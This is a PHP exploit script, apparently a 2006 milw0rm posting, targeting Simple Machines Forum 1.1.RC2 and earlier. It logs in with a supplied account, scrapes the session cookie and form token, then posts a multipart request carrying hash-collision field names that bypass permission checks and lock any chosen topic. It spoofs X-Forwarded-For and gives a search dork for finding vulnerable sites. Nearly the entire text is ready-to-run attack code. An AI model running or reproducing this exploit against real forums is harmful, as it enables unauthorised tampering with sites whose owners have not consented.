#!/usr/bin/php -q -d short_open_tag=on
<?
print_r('
--------------------------------------------------------------------------------
Simple Machines Forum <= 1.1.RC2 "lock"/Zend_Hash_Del_Key_Or_Index Vulnerability
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork, version specific: "Powered by SMF"
--------------------------------------------------------------------------------
');

if ($argc<6) {
print_r('
--------------------------------------------------------------------------------
Usage: php ".$argv[0]." host path user pass topic OPTIONS
host:       target server (ip/hostname)
path:       path to SMF
user/pass:  u need a valid user account
lock:       topic u want to lock
Options:
   -p[port]:    specify a port other than 80
   -P[ip:port]: specify a proxy
Examples:
php ".$argv[0]." localhost /smf/ user pass 4
php ".$argv[0]." localhost /smf/ user pass 3 -p81
php ".$argv[0]." localhost / user pass 7 -P1.1.1.1:80
--------------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}
function my_encode($my_string)
{
  $encoded="";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.="chr(".ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=").";}
  }
  return $encoded;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=$argv[4];
$topic=(int)$argv[5];
$port=80;
$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data="user=".urlencode($user);
$data.="&passwrd=".urlencode($pass);
$data.="&cookielength=-1";
$data.="&hash_passwrd=";
$data.="&submit=Login";
$packet ="POST ".$p."index.php?action=login2 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
echo "cookie -> ".$cookie."\r\n";
$temp=explode("PHPSESSID=",$cookie);
$temp2=explode(";",$temp[1]);
$sessid=$temp2[0];
echo "sessid -> ".$sessid."\r\n";
$temp=explode(";member=",$html);
$temp2=explode("\n",$temp[1]);
$uid=(int)$temp2[0];
echo "user id -> ".$uid."\r\n";

$packet="GET ".$p."index.php?action=post;topic=$topic.0;num_replies=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode('name="sc" value="',$html);
$temp2=explode("\"",$temp[1]);
$sc=$temp2[0];
echo "sc code -> ".$sc."\r\n";
$temp=explode('"num_replies" value="',$html);
$temp2=explode("\"",$temp[1]);
$replies=$temp2[0];
echo "num replies -> ".$replies."\r\n";

$hash_1="173250926";
$hash_2="266332046";

$data='-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="topic"

'.$topic.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="subject"

I totally disagree, locked.
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="icon"

xx
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="message"

I totally disagree, locked.
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="notify"

0
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="lock"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="'.$hash_1.'"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="'.$hash_2.'"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="sticky"

0
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="move"

0
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="attachment[]"; filename=""
Content-Type: application/octet-stream


-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="post"

Post
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="num_replies"

'.$replies.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="additional_options"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="sc"

'.$sc.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="seqnum"

0
-----------------------------7d61bcd1f033e--
';

$packet="POST ".$p."index.php?action=post2;start=3;board=".$board." HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="X-FORWARDED-FOR: 1.1.1.1\r\n";
$packet.="Referer: http://".$host.$path."index.php?action=post;topic=1.0;num_replies=0\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: ".$cookie."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

$packet= "GET ".$p."index.php?action=post;topic=$topic.0;num_replies=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="X-FORWARDED-FOR: 1.1.1.1\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if  (strstr($html,"This topic is locked")) {echo "Exploit succeeded...";}
else {echo "Exploit failed...";}
?>

# milw0rm.com [2006-08-22]
